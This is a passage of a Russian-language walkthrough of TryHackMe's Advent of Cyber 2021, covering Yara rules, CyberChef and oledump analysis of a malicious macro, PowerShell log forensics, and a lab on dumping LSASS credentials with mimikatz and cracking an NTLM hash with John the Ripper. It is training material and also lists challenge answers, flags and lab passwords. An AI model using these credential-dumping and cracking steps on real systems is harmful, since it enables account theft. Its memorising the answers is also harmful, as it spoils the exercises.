Вывод здесь показывает правило, которое совпало, строки, которые совпали, их идентификаторы и их расположение в 
файле. Обратите внимание, что снимок экрана содержит 3 из 4 строк, которые мы записали в правиле. Это потому, что мы 
изменили правило перед запуском этой команды таким образом, что одна из строк не появляется в файле. Следовательно, 
мы видим только строки, которые появляются в тестовом файле, и не видим те, которые не совпали.   

### Дополнительные ресурсы:

Для краткости мы только коснулись основ правил Yara в этой задаче. Правила Yara способны выполнять гораздо более 
сложные сопоставления с шаблонами, чем те, которые мы затронули здесь. Если вам интересно узнать больше о правилах 
Yara, вы можете проверить комнату Yara на TryHackMe. Вы также можете ознакомиться с  документацией Yara  или 
взглянуть на несколько правил, написанных сообществом, чтобы получить представление о том, какие типы правил Yara 
написаны сообществом.    

А пока давайте посмотрим, сможем ли мы ответить на следующие вопросы, чтобы оценить то, что мы узнали на данный момент.

Разверните машину, прикрепленную к задаче. Она будет видна в представлении с разделением экрана, когда будет готова. 
Если вы не видите машину в своем браузере, нажмите кнопку «Показать разделенный вид». 

### Ответить на вопросы ниже
Мы изменили текст в строке $a, как показано в написанном нами правиле eicaryara, с X5O на X50, то есть мы 
заменили букву O на цифру 0. Условие для правила Yara — $a и $b и $c и $d. Если мы хотим внести изменения только в 
первый логический оператор в этом условии, на какой логический оператор мы должны заменить «and», чтобы правило все 
еще попадало в файл?   
```commandline
or
```
Какая опция используется в команде Yara для вывода списка метаданных правил, относящихся к файлу? 
```commandline
-m
```
В каком разделе содержится информация об авторе правила Яры?
```commandline
metadata
```
Какая опция используется для вывода только тех правил, которые не сработали?
```commandline
-n
```
Измените значение правила Yara для  строки $a  на  X50 . Повторите команду, но на этот раз с  опцией -c. Каков 
результат? 
```commandline
0
```
## Задание 27
Пусть идет снег ... 

McSkidy наконец-то добрался до идентификации первого следа Grinch Enterprises в своей сети. Они изучают локальные 
машины, чтобы определить, что именно они сделали, когда впервые вошли в сеть. Можете ли вы помочь им разобраться в 
том, что произошло?  

Посмотрите видео-обучение SecurityNinja на 22-й день здесь

Вы, вероятно, слышали о Cyber Swiss Army Knife - CyberChef. Этот инструмент поможет вам узнать, что сделали 
Grinch Enterprises, когда они впервые вошли в сеть. 

Все, что вам нужно, это быть хорошим поваром и следовать рецептам! 

В левой колонке вы можете выбрать ингредиенты или операции, которые вы хотите использовать, чтобы испечь лучший торт 
для этой рождественской вечеринки, как показано на изображении ниже: 




Чтобы испечь идеальный вкусный торт, вам нужно добавить необходимые ингредиенты в правильном порядке, перетащив их в 
среднюю колонку с надписью  Рецепт .  Круто, правда?  

Например, давайте декодируем строку, закодированную в base64  `R3JpbmNoIEVudGVycHJpc2VzIHdvbid0IHRha2Ugb3ZlciB0aGUgTm9ydGggUG9sZSE=`:


По данным  Mozilla ,  «схемы кодирования Base64 обычно используются, когда необходимо кодировать двоичные данные, 
которые необходимо хранить и передавать через носители, предназначенные для работы с ASCII».   Хотя злоумышленники 
по-прежнему используют эту простую форму обфускации, чтобы обойти обнаружение антивирусами, это далеко не самый 
эффективный и скрытный метод.   

Чтобы расшифровать строку выше, мы используем ингредиент From Base64 в столбце Operations, перетащив его под панель 
Recipe (или дважды щелкнув From Base64), затем вставим нашу строку в кодировке base64  
R3JpbmNoIEVudGVycHJpc2VzIHdvbid0IHRha2Ugb3ZlciB0aGUgTm9ydGggUG9sZSE= в область Input text и, наконец, ВЫПЕЧЕМ ее!  
Вы увидите результаты деобфусцированной строки  в  поле Output  . Grinch Enterprises won't take over the North Pole!    

Вы можете перетащить в поле «Рецепт» столько ингредиентов, сколько захотите, чтобы получить результат, который имеет 
смысл для вас :) 

CyberChef обладает множеством интересных функций, таких как возможность расшифровать файл или текст, зашифрованный с 
использованием различных шифров, как показано ниже: 


Еще один заслуживающий внимания шифр, который часто используют злоумышленники и на котором мы сосредоточимся, — это 
шифр XOR (исключающее ИЛИ ( XOR )). 

Исключающее или XOR — это логический оператор, который возвращает значение «истина» (1), когда два значения различны 
(одно — «истина», а другое — «ложь»), и 0, когда два значения одинаковы, как показано на рисунке ниже: 



Теперь, когда мы рассмотрели основы CyberChef и некоторые распространенные методы обфускации, давайте рассмотрим еще 
один полезный инструмент для выполнения этой задачи. 

Oledump  ( oledump.py ) — это превосходный инструмент, написанный на Python Дидье Стивенсом, который помогает вам 
анализировать файлы OLE (Compound File Binary Format). Вы можете представить себе файлы OLE как «мини-файловую 
систему» или нечто похожее на архив Zip. Такие приложения, как MS Office с расширениями  .doc, .xls, .ppt,  
известны как файлы OLE. Злонамеренные субъекты могут использовать макросы для сокрытия вредоносных команд/скриптов в 
документах Excel и Word.    

Вы можете выполнить команду  oledump.py [Filename] для просмотра потоков, как показано ниже:

Командная строка
```commandline
C:\Desktop\Tools>oledump.py Document1.doc
1: 114 '\x01CompObj'
2: 4096 '\x05DocumentSummaryInformation'
3: 4096 '\x05SummaryInformation'
4: 13859 '1Table'
5: 33430 'Data'
6: 365 'Macros/PROJECT'
7: 41 'Macros/PROJECTwm'
8: M 9852 'Macros/VBA/ThisDocument'
9: 5460 'Macros/VBA/_VBA_PROJECT'
10: 513 'Macros/VBA/dir'
```
Согласно документации по  файлам OLE , файлы OLE могут содержать  хранилища  , которые по сути являются папками, 
содержащими  потоки  данных или другие  хранилища . Пример ниже показывает, как выглядит типичный документ Word «под 
капотом», и потоки данных, которые вы обычно видите. Каждый поток имеет имя и  oledump будет удобно индексировать 
каждый поток, назначая ему номер, чтобы легко выбрать его для анализа.   


Буква  M  рядом с потоком указывает на то, что поток содержит  макрос VBA . Макросы VBA создаются с использованием 
языка программирования Visual Basic for Applications и имеют законные варианты использования. Например, макросы 
позволяют пользователям создавать пользовательские функции для автоматизации повторяющихся или трудоемких задач в 
Excel или Word.   

Прежде чем начать использовать oledump.py, давайте рассмотрим некоторые полезные опции для анализа файлов OLE. Чтобы 
изучить больше опций, используйте опцию  -m . 
- -A  создает дамп ASCII, аналогичный параметру -a, но дублирующиеся  строки удаляются.
- -S  выводит строки.
- -d  создает необработанный дамп содержимого потока. 
- -s  НОМЕР ПОТОКА  или  --select = НОМЕР ПОТОКА  позволяет выбрать номер потока для анализа ( -s a  для выбора всех 
  потоков)
- -d ,  --dump  - выполнить сырой дамп
- -x, --hexdump  — выполнить шестнадцатеричный дамп
- -a, --asciidump  — выполнить дамп ascii
- -S, --strings  — выполнить дамп строк
- -v, --vbadecompress  — распаковка VBA

Grinch Enterprises оставили вредоносный документ на машине, и вам нужно его найти. Документ содержит вредоносный 
обфусцированный скрипт в кодировке base64, который также поставляется с «секретным» компонентом шифра...  десятичное 
число 35.  Выясните, что делает вредоносный скрипт, и найдите два флага.  

Чтобы решить эту задачу, вам нужно найти поток, содержащий запутанный скрипт. Выберите макропоток номер 8 и сделайте 
дамп содержимого, выполнив команду: 
`oledump.py -s 8 -d`

Десятичное число 35 будет нашим  ключом XOR  . Давайте создадим рецепт в CyberChef, используя следующие ингредиенты:

1.  Из Base64
2.  XOR  35 (Не забудьте выбрать Decimal из выпадающего списка!)

Вы могли заметить, что секретный скрипт все еще выглядит странно, потому что он дважды закодирован с использованием 
Base64! Давайте выберем  From Base64  для нашего третьего ингредиента.  

### Теперь, когда вы вооружены знаниями, давайте начнем испытание!
Виртуальная машина запустится в браузере. Если вы хотите получить доступ к виртуальной машине через удаленный 
рабочий стол, используйте учетные данные ниже.  

IP-адрес машины : MACHINE_IP

Пользователь : administrator
Пароль : sn0wF!akes!!!



Примите сертификат при появлении соответствующего запроса, и вы должны войти в удаленную систему.
Примечание : Полная загрузка виртуальной машины может занять до 3 минут.

### Ответить на вопросы ниже
Каково имя пользователя (адрес электронной почты Grinch Enterprises) из расшифрованного скрипта?
```commandline
Grinch.Enterprises.2021@gmail.com
```
Какой  пароль почтового ящика вы нашли ?
```commandline
S@ntai$comingt0t0wn
```
Какова тема письма?
```commandline
Christmas Wishlist
```
Какой порт использует скрипт для извлечения данных с Северного полюса?
```commandline
587
```
Какой скрытый флаг был найден в документе, оставленном Grinch Enterprises? (Подсказка: используйте следующую команду 
oledump.py -s {номер потока} -d, ответ будет в подписи). 
```commandline

YouFoundGrinchCookie
```
Где-то еще есть второй флаг... можете ли вы найти его на машине?
```commandline
S@nt@c1Au$IsrEAl
```

## Задание 28
Разверните виртуальную машину, прикрепленную к этой задаче; она будет видна в режиме разделенного экрана, как только 
будет готова.  

Если вы не видите загрузку виртуальной машины, нажмите  кнопку «Показать разделенный вид». 



Посмотрите видео-обучение Сакиба на 23-й день  здесь
Один из администраторов, имеющих доступ к системе Elf Dome Defense, обнаружил, что его файл паролей пропал с его 
рабочего стола. Без пароля он не сможет войти в панель управления полетами. Макскиди подозревает, что, возможно, 
одна из предыдущих попыток фишинга была успешной. Макскиди переходит к действиям.  

Вам необходимо проверить журналы событий, чтобы определить, что произошло, и попытаться восстановить пароль из 
удаленного текстового файла.  

### Цели обучения:
- Анализируйте журналы событий Windows, чтобы понять действия, выполненные при атаке.
- Восстанавливайте ключевые артефакты в незашифрованных веб-коммуникациях. 
- Используйте скрипты PowerShell для восстановления удаленного артефакта. 
- PowerShell  встроен в операционную систему Windows. Это полезный инструмент для администраторов Windows, позволяющий 
автоматизировать повседневные задачи. PowerShell также позволил злоумышленникам выполнять гнусные действия, 
концепция, известная как Living off the Land.    

Официальное определение PowerShell от Microsoft: « PowerShell — это кроссплатформенное решение для автоматизации 
задач, состоящее из оболочки командной строки, языка сценариев и инфраструктуры управления конфигурацией. PowerShell 
работает на Windows, Linux и macOS ».   

Ссылка -  https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2

Как защитники, мы можем проводить аудит команд, запущенных в консоли PowerShell на каждой рабочей станции. Это 
известно как  PowerShell Logging . Когда запускается команда или скрипт PowerShell , активность регистрируется в 
системе журнала событий Windows.  

В системе Windows создается множество журналов событий, но интересующие нас журналы относятся к PowerShell . 

Журналы событий классифицируются по поставщикам, например  Microsoft-Windows- PowerShell . Каждый поставщик имеет 
определенные идентификаторы событий для идентификации конкретных событий или действий, которые произошли на рабочей 
станции. Идентификаторы событий, представляющие для нас интерес в этом расследовании, —  4103  и  4104 .  

Обычно вы используете  Event Viewer  для локального просмотра журналов событий в системе Windows, но мы установили 
отличный инструмент под названием  Full Event Log View,  который поможет сделать этот процесс безболезненным.  

При запуске инструмента он отобразит большое количество журналов событий. Не волнуйтесь; поиск — ваш друг. 



Откройте Дополнительные параметры, чтобы начать поиск.



События, представляющие интерес для этой конечной точки, произошли несколько недель назад, а именно в течение недели 
11 ноября 2021 г. Используйте приведенные ниже критерии поиска, чтобы начать. 



В качестве альтернативы вы можете выполнить поиск на основе строкового значения, ключевого слова. Вы знаете, что в 
атаке задействован веб-трафик. Возможно, хорошим ключевым словом будет « HTTP ». 



Дополнительные ресурсы:

Исследование Windows 2.0: https://tryhackme.com/jr/investigatingwindows2
Исследование Windows 3.x: https://tryhackme.com/jr/investigatingwindows3
PowerShell для пентестеров: https://tryhackme.com/jr/powershellforpentesters
Если вы хотите получить доступ к виртуальной машине через удаленный рабочий стол, используйте указанные ниже учетные 
данные.  

IP-адрес машины : MACHINE_IP

Пользователь : administrator

Пароль : sn0wF!akes!!!



Примите сертификат при появлении соответствующего запроса, и вы должны войти в удаленную систему.

Примечание: загрузка виртуальной машины может занять до 3 минут.

### Ответить на вопросы ниже
Какая команда была выполнена от имени Эльфа Макнили для добавления нового пользователя к машине?
```commandline
Invoke-Nightmare
```
Какой пользователь запустил файл PowerShell для отправки файла password.txt с рабочего стола администратора на 
удаленный сервер? 
```commandline
adm1n
```
Какой был IP-адрес удаленного сервера? Какой порт использовался для удаленного подключения? (формат: IP,Port)
```commandline
10.10.148.96,4321
```
Какой ключ шифрования использовался для шифрования содержимого текстового файла, отправленного на удаленный сервер?
```commandline
j3pn50vkw21hhurbqmxjlpmo9doiukyb
```
Какое приложение использовалось для удаления файла password.txt?
```commandline
sdelete.exe
```
Какую дату и временную метку показывают журналы, что файл password.txt был удален? (формат: ММ/ДД/ГГГГ Ч:ММ:СС PM)
```commandline
11/11/2021 7:29:27 PM
```
Каково было содержимое удаленного файла password.txt?
```commandline
Mission Control: letitsnowletitsnowletitsnow
```

## Задание 29
### История
McSkidy узнала много нового о том, как работает Grinch Enterprises, и хочет подготовиться к любым будущим атакам со 
стороны тех, кто ненавидит Рождество. Из проведенного ими криминалистического анализа она заметила, что Grinch 
Enterprises выполнила некоторые вредоносные действия. Она хочет выполнить их на той же машине, которую они 
скомпрометировали, чтобы немного лучше понять своих противников. Можете ли вы проследить за ней и помочь ей 
подготовиться к любым другим атакам?    

Видео для сегодняшнего задания отсутствует.

### Цели обучения
В этом задании вы:
- Понять пост-эксплуатацию
- Узнайте, как хранятся пароли в Windows
- Дамп паролей из процесса LSASS в Windows
- Взломать хэши паролей
### Пост Эксплуатация
Этап постэксплуатации обычно происходит после того, как злоумышленник получил несанкционированный доступ к системе. 
  На этом этапе злоумышленник будет стремиться сделать следующее: 
- Повысить свои привилегии: злоумышленник попытается получить доступ к конфиденциальной информации (документации о 
  том, как работают внутренние технологические стеки, или учетным данным для других систем) или критически важным 
  функциям, которые доступны только пользователям с более высокими привилегиями, например, административным порталам 
  для управления пользователями.   
- Поддержание устойчивости в целевой среде: злоумышленник может настроить другие механизмы для поддержания доступа к 
  среде, если его текущий доступ был заблокирован или удален.
- Информация, полученная на этапе после эксплуатации, позволяет злоумышленникам перечислять, идентифицировать и 
  эксплуатировать другие компоненты в более широкой среде/сети. Предположим, что злоумышленник взломал систему, в 
  которой хранится информация о кадрах. В этом случае они могут использовать имена и данные сотрудников для 
  проведения атак социальной инженерии (например, фишинга) против этих сотрудников.  

В этом случае мы рассмотрим распространенный сценарий после эксплуатации, когда злоумышленник получает доступ к 
привилегированному пользователю в Windows. Злоумышленники часто сбрасывают хэши паролей и взламывают их, чтобы 
получить открытые текстовые пароли пользователей. Перед тем как рассмотреть этот сценарий, мы кратко рассмотрим 
хэширование паролей, аутентификацию в Windows и то, почему возможно выполнять эти действия.   

### Хеширование паролей
Хэш пароля представляет собой исходный пароль, преобразованный в другую форму. Хеширование этого пароля применяет 
одностороннее преобразование для изменения пароля в виде открытого текста на форму, которую трудно распознать. Когда 
строка предоставляется хеш-функции, выход этой хеш-функции представляет собой строку фиксированной длины, которая 
является уникальной для предоставленных входных данных. Это хеширование выполняется различными типами алгоритмов, 
включая MD5 , SHA1 и SHA256.    

`пароль123 → MD5 → 7576f3a00f6de47b0c72c5baf2d505b0`

(ВХОД → ФУНКЦИЯ → ВЫХОД)

Как вы можете видеть выше, пароль преобразуется в строку, казалось бы, случайных символов с помощью алгоритма MD5. 
Использование хеширования паролей позволяет системам проверять правильность паролей без сохранения исходного пароля. 
Если злоумышленник получит доступ к системе, которая хранит пароли в открытом виде, он может легко использовать эти 
пароли в вредоносных целях. Однако, если пароли хешированы, злоумышленнику может быть сложно получить пароли в 
открытом виде (это зависит от используемого алгоритма и сложности пароля пользователя).    

Хотя эти хэш-функции являются односторонними функциями, которые должны сильно затруднить извлечение исходной формы 
пароля, при определенных условиях злоумышленники все равно могут восстановить пароль в открытом виде, 
соответствующий хешу пароля. Распространенный способ извлечения этих паролей в открытом виде (обычно называемых 
взломом хешей) — обход различных входов в алгоритм хэширования и проверка того, соответствует ли выход исходному 
хешу.    

Например, если рассматриваемый хеш пароля — 7576f3a00f6de47b0c72c5baf2d505b0, а злоумышленник знает, что алгоритм 
хеширования — MD5 , он может попробовать различные формы паролей, чтобы проверить, соответствуют ли хеш-коды 
исходному хешу:  
```commandline
пароль12 → MD5 → eebf9d92578b4212b541fb41f326a8f2

пароль123 → MD5 → 7576f3a00f6de47b0c72c5baf2d505b0

пароль1234 → MD5 → 1e61d855bd708b5235d19a53e48ba5a5
```
Здесь вы можете видеть, что хеш для password123 совпадает с исходным хешем, представленным выше.

### Аутентификация и хеширование
Windows хранит различные учетные данные в базе данных Security Accounts Manager (SAM). Обычно учетные данные, такие 
как пароли пользователей, хранятся в виде хэшей в базе данных SAM.

Два наиболее распространенных хеша, хранящихся в базе данных SAM:

LAN Manager (LM) — этот хэш — старейшая форма хранения паролей, используемая Windows, которая сохраняется для 
устаревших систем. Алгоритм, используемый для создания этого хеша, использует ограниченный набор символов в качестве 
входных данных, поэтому можно попробовать все комбинации букв и цифр, чтобы получить исходный хэш.
NT LAN Manager ( NTLM ) — современные системы Windows используют этот алгоритм хеширования для хранения паролей.
Когда пользователь входит в локальную машину Windows, процесс Local Security Authority Subsystem Service (LSASS) 
извлекает учетные данные пользователя из базы данных SAM. Он сравнивает их с хэшированной формой пароля пользователя.
Если хэш пароля, введенного пользователем, совпадает с хэшем пароля, сохраненного в базе данных SAM, то пользователь 
может успешно войти в систему.

После успешного входа этого пользователя в систему процесс LSASS сохраняет учетные данные пользователя в памяти. Это 
сделано для удобства; когда пользователи получают доступ к другим ресурсам, им не нужно постоянно вводить свои 
учетные данные, но процесс LSASS использует учетные данные, хранящиеся в памяти, для различных действий.

### Сброс хэшей паролей
Разверните машину, прикрепленную к этой задаче, с помощью зеленой кнопки Start Machine и Access the machine on 
$MACHINE_IP. Эта машина доступна в браузере. Кроме того, вы также можете получить доступ к машине через RDP, 
используя учетные данные:  

Имя пользователя: Администратор
Пароль: letmein123!
Кроме того, разверните блок атаки, который будет использоваться в следующем разделе этой задачи.

Когда злоумышленник получает доступ к локальной системе Windows, одним из первых действий, которые он сделает, будет 
сброс хэшей паролей, хранящихся в процессе LSASS. Поскольку процесс LSASS должен взаимодействовать с базой данных 
SAM и хранить учетные данные в памяти, он обычно работает с большими привилегиями, чем стандартный пользователь. 
Чтобы злоумышленник мог взаимодействовать с LSASS, ему необходимо иметь высокие привилегии.   

Стандартный инструмент, используемый для извлечения хэшей паролей из памяти, называется mimikatz( https://github.com/gentilkiwi/mimikatz). 
Mimikatz имеет различные модули, которые можно использовать для извлечения различных 
видов учетных данных из памяти и использования этих учетных данных для доступа к учетным записям пользователей. Для 
этого упражнения мы будем использовать модуль  . sekurlsa   

Откройте PowerShell с помощью меню «Пуск», перейдите к C:\Users\Administrator\Desktop\mimikatz\x64программе mimikatz и запустите ее.

Запуск Мимикац
```commandline
PS C:\Users\Administrator\Desktop\mimikatz\x64> .\mimikatz.exe
.#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #

```

Используйте следующую команду, чтобы проверить, есть ли у вас соответствующие права для запуска программы:

Проверка привилегий
mimikatz # privilege::debug
Privilege '20' OK
После того, как вы убедились, что у вас есть соответствующие привилегии, мы выгрузим пароли из памяти LSASS с 
помощью sekurlsaмодуля. Этот модуль используется для извлечения различных учетных данных из памяти LSASS. Для 
использования этого модуля вам необходим доступ администратора или учетная запись SYSTEM.  

В этом модуле мы можем использовать logonpasswordsфункцию для извлечения учетных данных текущих авторизованных 
пользователей: 


Сброс паролей
```commandline
mimikatz # sekurlsa::logonpasswords
Authentication Id : 0 ; 595919 (00000000:000917cf)
Session           : RemoteInteractive from 3
User Name         : em***
Domain            : THM
Logon Server      : THM
Logon Time        : 12/8/2021 9:09:24 PM
SID               : S-1-5-21-1966530601-3185510712-10604624-1009
        msv :
         [00000003] Primary
         * Username : em***
         * Domain   : THM
         * NTLM     : 8af32*******************
         * SHA1     : 8c4c6*******************
        tspkg :
        wdigest :
         * Username : em***
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : Mc***
         * Domain   : THM
         * Password : (null)
        ssp :
        credman :
```

Из вышеприведенного вывода видно, что мы смогли получить хэши NTLM и SHA1 для другого пользователя, вошедшего в 
систему. Теперь, когда у нас есть хэш пароля NTLM, давайте попробуем взломать хэш, чтобы получить пароль в открытом 
виде.  

### Взлом хэшей паролей
В предыдущем разделе мы упомянули, что мы могли бы передавать комбинации потенциальных входных данных в используемый 
алгоритм хеширования и сравнивать эти хэши с нашим целевым хешем. В этом случае мы будем использовать инструмент под 
названием John The Ripper для взлома хэшей паролей. Чтобы использовать John The Ripper, запустите AttackBox и 
скопируйте восстановленный вами NTLM-хэш в файл под названием hash.txt   


Ввод хэша пароля
`echo 'PASSWORD-HASH-HERE'> hash.txt`
После копирования хэша выполните следующую команду:


Взлом хэша пароля
```commandline
john --format=NT -w=/usr/share/wordlists/rockyou.txt hash.txt --pot=output.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
1********       (?)
1g 0:00:00:00 DONE (2021-12-20 17:59) 100.0g/s 19200p/s 19200c/s 19200C/s 123456..november
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

Параметры и аргументы, используемые в приведенной выше команде, следующие:

—format=NT используется для представления типа хэша. В этом случае мы указываем, что хотим взломать NTLM- хэш. 
Полный список форматов, поддерживаемых john, можно найти с помощью команды john --list=formats. 
/usr/share/wordlists/rockyou.txt — это список слов, содержащий входные пароли, которые будут хэшированы Джоном и 
сравнены с нашим хешем. 
hash.txt представляет собой текстовый файл, содержащий хэш
—pot=output.txt представляет собой выходной файл, в котором будет сохранен извлеченный в открытом виде пароль
Вывод выше показывает, что john успешно взломал пароль. Используйте команду cat, чтобы прочитать взломанный пароль, 
который будет в формате$HASH-TYPE$PASSWORD-HASH:RECOVERED-PASSWORD 

Чтобы углубить понимание концепций этого задания, ознакомьтесь со следующими комнатами:
Взлом хэшей паролей с помощью Джона Потрошителя
Изучение основ постэксплуатации
### Ответить на вопросы ниже
Какое имя пользователя у другого пользователя в системе?
```commandline
emily
```
Каков NTLM-хэш этого пользователя?
```commandline
8af326aa4850225b75c592d4ce19ccf5
```
Какой пароль у этого пользователя?
```commandline
1234567890
```

## Задание 30
[Спасибо]
Большое спасибо за участие в мероприятии Advent of Cyber в этом году!

### Ответить на вопросы ниже
Помогите нам стать лучше, ответив на этот 5-минутный опрос! https://forms.gle/ET6KY5dwcBumsqNv8
```commandline
thm{thank_you_2021}
```
Продолжайте обучение по программам  «Предварительная безопасность»,  «Младший тестировщик на проникновение» или 
«Защитная безопасность»! 
```commandline
Ответ не нужен
```
Победители будут объявлены 27 декабря - до этого времени у вас есть время выполнить задания. Помните, чем больше 
вопросов вы ответите, тем выше ваши шансы на победу! 
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)